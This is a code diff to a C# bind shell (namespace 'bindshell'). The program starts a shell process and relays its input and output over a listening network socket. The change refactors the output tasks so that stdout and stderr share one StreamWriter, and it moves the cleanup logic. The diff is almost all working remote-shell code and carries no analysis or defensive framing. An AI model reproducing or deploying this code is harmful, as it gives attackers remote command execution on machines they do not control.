@@ -18,12 +18,12 @@ namespace bindshell
         {
             return Encoding.ASCII.GetString(byts, 0, nBytes);
         }
-        public static Task CreateOutputTask(this StreamReader Input, NetworkStream nStream, CancellationToken ctoken)
+        public static Task CreateOutputTask(this StreamReader Input, StreamWriter nStream, CancellationToken ctoken)
         {
             Task tOutput = new Task(new Action(() =>
             {
                 Stream st = Input.BaseStream;
-                StreamWriter sw = new StreamWriter(nStream);
+                StreamWriter sw = nStream;
                 byte[] buff = new byte[64];
                 int rSize;
                 while (!ctoken.IsCancellationRequested)
@@ -31,7 +31,7 @@ namespace bindshell
                     try
                     {
                         rSize = 0;
-                        rSize = st.Read(buff, 0, buff.Length);
+                        rSize = st.Read(buff, 0, buff.Length);                        
                         sw.Write(buff.GetString(rSize));
                         sw.Flush();
                     }
@@ -101,22 +101,24 @@ namespace bindshell
             Shell.Start();
             using (NetworkStream ns = new NetworkStream(client))
             {
-                tOut = Shell.StandardOutput.CreateOutputTask(ns, CTokenSrc.Token);
-                tErr = Shell.StandardError.CreateOutputTask(ns, CTokenSrc.Token);
-                tIn = Shell.StandardInput.CreateInputTask(ns, CTokenSrc.Token);
-
-                SocketService.StartAllTask(tErr, tOut, tIn);
-
-                while (!client.Poll(5000, SelectMode.SelectRead)) 
+                using (StreamWriter ws = new StreamWriter(ns))
                 {
-                    if (Shell.HasExited) break;
+                    tOut = Shell.StandardOutput.CreateOutputTask(ws, CTokenSrc.Token);
+                    tErr = Shell.StandardError.CreateOutputTask(ws, CTokenSrc.Token);
+                    tIn = Shell.StandardInput.CreateInputTask(ns, CTokenSrc.Token);
+
+                    SocketService.StartAllTask(tErr, tOut, tIn);
+
+                    while (!client.Poll(5000, SelectMode.SelectRead))
+                    {
+                        if (Shell.HasExited) break;
+                    }
+
+                    CTokenSrc.Cancel();
+                    if (!Shell.HasExited) Shell.Kill();
+                    Task.WaitAll(tErr, tOut, tIn);
                 }
-                
-                CTokenSrc.Cancel();
-                if (!Shell.HasExited) Shell.Kill();
-                Task.WaitAll(tErr, tOut, tIn);
             }
-            CTokenSrc = null;
             client.Close();
             Listener.Close();
         }        
